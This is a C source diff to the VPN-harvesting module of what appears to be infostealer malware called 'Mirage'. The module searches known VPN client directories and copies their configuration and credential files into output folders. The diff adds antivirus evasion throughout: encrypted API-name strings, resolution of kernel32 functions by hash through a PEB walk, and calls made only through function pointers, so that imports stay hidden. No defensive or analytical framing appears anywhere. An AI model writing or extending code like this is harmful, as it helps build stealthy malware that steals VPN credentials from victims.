@@ -1,5 +1,9 @@
 #include "vpn.h"
 #include "config.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
 #include <windows.h>
 
 #ifdef ENABLE_VPN_NORDVPN
@@ -8,6 +12,40 @@
 
 #define VPN_MAX_PATH 512
 #define VPN_MAX_CLIENTS 18
+
+/* PEB-walk API resolution for kernel32 file APIs */
+typedef HANDLE (WINAPI *pFFA)(const char *, WIN32_FIND_DATAA *);
+typedef BOOL   (WINAPI *pFNA)(HANDLE, WIN32_FIND_DATAA *);
+typedef BOOL   (WINAPI *pFC)(HANDLE);
+typedef BOOL   (WINAPI *pCFA)(const char *, const char *, BOOL);
+typedef BOOL   (WINAPI *pCDA)(const char *, void *);
+
+static struct {
+    pFFA pFF; pFNA pFN; pFC pFClose; pCFA pCF; pCDA pCD;
+    int  ready;
+} vpn_api;
+
+static int vpn_ensure_api(void) {
+    if (vpn_api.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
+    vpn_api.pFF = (pFFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
+    vpn_api.pFN = (pFNA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
+    vpn_api.pFClose = (pFC)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CopyFileA, ENC_COPYFILEA_LEN, fn);
+    vpn_api.pCF = (pCFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
+    vpn_api.pCD = (pCDA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!vpn_api.pFF || !vpn_api.pFN || !vpn_api.pFClose ||
+        !vpn_api.pCF || !vpn_api.pCD) return 0;
+    vpn_api.ready = 1;
+    return 1;
+}
 
 /* ------------------------------------------------------------------ */
 /*  VPN client table (mirrors Mirage vpn.zig)                         */
@@ -46,30 +84,28 @@ static const VpnEntry vpn_table[VPN_MAX_CLIENTS] = {
 /* ------------------------------------------------------------------ */
 
 static int dir_exists(const char *path) {
+    if (!vpn_ensure_api()) return 0;
     char pattern[VPN_MAX_PATH];
     WIN32_FIND_DATAA fd;
     HANDLE hFind;
     int found;
 
     snprintf(pattern, sizeof(pattern), "%s\\*", path);
-    hFind = FindFirstFileA(pattern, &fd);
+    hFind = vpn_api.pFF(pattern, &fd);
     if (hFind == INVALID_HANDLE_VALUE)
         return 0;
-    FindClose(hFind);
+    vpn_api.pFClose(hFind);
 
-    /* Confirm at least one entry exists (the "." entry always exists
-       for real directories, but FindFirstFileA succeeds for files too,
-       so check for DIRECTORY flag on at least one result). */
     found = 0;
-    hFind = FindFirstFileA(pattern, &fd);
+    hFind = vpn_api.pFF(pattern, &fd);
     if (hFind != INVALID_HANDLE_VALUE) {
         do {
             if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                 found = 1;
                 break;
             }
-        } while (FindNextFileA(hFind, &fd));
-        FindClose(hFind);
+        } while (vpn_api.pFN(hFind, &fd));
+        vpn_api.pFClose(hFind);
     }
     return found;
 }
@@ -87,7 +123,7 @@ static int has_ext(const char *filename, const char *ext) {
 /* Create directory recursively (single extra level is enough for VPN
    output dirs like "vpn\\NordVPN"). */
 static void ensure_dir(const char *path) {
-    CreateDirectoryA(path, NULL);
+    vpn_api.pCD(path, NULL);
 }
 
 /* ------------------------------------------------------------------ */
@@ -97,13 +133,14 @@ static void ensure_dir(const char *path) {
 /* Copy all matching files from src_dir into dst_dir.  Returns count. */
 static int copy_matching_files(const char *src_dir, const char *dst_dir,
                                const char *ext) {
+    if (!vpn_ensure_api()) return 0;
     char pattern[VPN_MAX_PATH];
     WIN32_FIND_DATAA fd;
     HANDLE hFind;
     int count = 0;
 
     snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);
-    hFind = FindFirstFileA(pattern, &fd);
+    hFind = vpn_api.pFF(pattern, &fd);
     if (hFind == INVALID_HANDLE_VALUE)
         return 0;
 
@@ -118,11 +155,11 @@ static int copy_matching_files(const char *src_dir, const char *dst_dir,
         snprintf(src_path, sizeof(src_path), "%s\\%s", src_dir, fd.cFileName);
         snprintf(dst_path, sizeof(dst_path), "%s\\%s", dst_dir, fd.cFileName);
 
-        if (CopyFileA(src_path, dst_path, FALSE))
+        if (vpn_api.pCF(src_path, dst_path, FALSE))
             count++;
-    } while (FindNextFileA(hFind, &fd));
+    } while (vpn_api.pFN(hFind, &fd));
 
-    FindClose(hFind);
+    vpn_api.pFClose(hFind);
     return count;
 }
 
